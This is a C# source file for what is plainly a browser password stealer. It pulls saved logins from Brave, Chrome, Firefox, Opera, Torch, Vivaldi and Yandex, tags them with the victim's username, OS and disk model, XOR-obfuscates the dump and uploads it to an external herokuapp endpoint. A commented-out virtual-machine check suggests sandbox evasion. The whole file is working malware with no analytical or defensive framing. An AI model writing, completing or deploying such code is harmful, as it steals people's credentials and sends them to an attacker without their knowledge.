using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;

namespace dao
{
    public class Main
    {
        public static void StartThread()
        {
            Thread thread = new Thread(() => Start());
            thread.Start();
        }

        public static void Start()
        {
            try
            {
                List<IReader> readers = new List<IReader>
                {
                    new Brave(),
                    new Chrome(),
                    new Firefox(),
                    new Opera(),
                    new Torch(),
                    new Vivaldi(),
                    new Yandex()
                };
                String username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                String osname = Environment.OSVersion.ToString();
                String hd = GetHDModel();
                String text;
                text = $"<{username} - {osname} / {hd}> v6\r\n\r\n";
                foreach (var reader in readers)
                {
                    try
                    {
                        var data = reader.Passwords();
                        if (data.Count() > 0)
                        {
                            text += $"* {reader.BrowserName}\r\n";
                            foreach (var d in data)
                                text += ($"{d.Url}\t\t({d.Profile})\r\n\t\t{d.Username}\r\n\t\t{d.Password}\r\n");
                        }
                    }
                    catch (Exception ex)
                    {
                        text += ($"Error reading {reader.BrowserName} passwords: " + ex.Message);
                    }
                    text += "\r\n";
                }
                byte[] bytes = Encoding.UTF8.GetBytes(text);
                bytes = XorBytes(bytes, KEY_BYTES);
                HP("https://vast-inlet-37297.herokuapp.com//note", bytes);
            }
            catch { }
        }

        private static String RunCMD(String cmd)
        {
            using (Process p = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = cmd,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            })
            {
                p.Start();
                StreamReader sr = p.StandardOutput;
                sr.ReadLine();
                sr.ReadLine();
                String line = sr.ReadLine().Trim();
                sr.Close();
                return line;
            }
        }

        private static String GetHDModel()
        {
            String result = RunCMD(@"/c wmic path win32_physicalmedia where tag='\\\\.\\PHYSICALDRIVE0' get model").Trim();
            if (result.Length > 0) return result;
            result = RunCMD(@"/c wmic diskdrive where deviceid='\\\\.\\PHYSICALDRIVE0' get model").Trim();
            return result;
        }

        private static readonly byte[] KEY_BYTES = new byte[] { 48, 5, 120, 79 };

        public static byte[] XorBytes(byte[] input, byte[] key)
        {
            int length = input.Length;
            int keyLength = key.Length;
            for (int i = 0; i < length; i++)
            {
                input[i] ^= key[i % keyLength];
            }
            return input;
        }

        public static string HP(string url, byte[] bytes)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/octet-stream"; // or whatever - application/json, etc, etc
            Stream requestWriter = request.GetRequestStream();
            {
                requestWriter.Write(bytes, 0, bytes.Length);
            }
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (StreamReader sr = new StreamReader(response.GetResponseStream()))
                {
                    return sr.ReadToEnd();
                }
            }
        }

        //public static Boolean CheckVM()
        //{
        //    using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        //    {
        //        using (var items = searcher.Get())
        //        {
        //            foreach (var item in items)
        //            {
        //                string manufacturer = item["Manufacturer"].ToString().ToLower();
        //                if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
        //                    || manufacturer.Contains("vmware")
        //                    || item["Model"].ToString() == "VirtualBox")
        //                {
        //                    return true;
        //                }
        //            }
        //        }
        //    }
        //    return false;
        //}
    }
}
